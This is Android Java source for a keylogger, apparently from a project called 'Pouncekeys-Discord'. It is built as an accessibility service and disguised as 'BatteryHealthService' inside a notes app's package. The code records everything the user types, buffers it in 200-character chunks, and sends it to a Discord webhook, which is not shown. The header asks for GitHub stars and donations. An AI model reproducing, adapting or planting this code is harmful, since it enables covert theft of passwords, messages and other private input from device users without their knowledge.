// "Pouncekeys-Discord" find me @ nullpounce.com (links to socials on bottom of the page)
// and please consider giving a star on github or even making a kofi donation :)

package com.omgodse.notally;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.List;

public class BatteryHealthService extends AccessibilityService {
    private static final String TAG = BatteryHealthService.class.getSimpleName();
    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;

    @SuppressLint("LongLogTag")
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> textList = event.getText();
            for (CharSequence text : textList) {
                String newText = text.toString();
                int newKeyEventCount = countKeyEvents(newText);

                if (newKeyEventCount > keyEventCount) {
                    currentKeyEvents.append(newText.substring(keyEventCount));

                    if (currentKeyEvents.length() >= 200) {
                        // Send accumulated key events to Discord webhook
                        sendToDiscord(currentKeyEvents.toString());
                        Log.i(TAG, "Typed: " + currentKeyEvents.toString());
                        currentKeyEvents.setLength(0); // Clear the builder
                    }
                }

                keyEventCount = newKeyEventCount;
            }
        }
    }

    private int countKeyEvents(String text) {
        // Count the number of key events (assuming each character is a key event)
        return text.length();
    }

    private void sendToDiscord(String log) {
        new MessageSender().execute(log);
    }

    @Override
    public void onInterrupt() {
        // Handle interruption
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }
}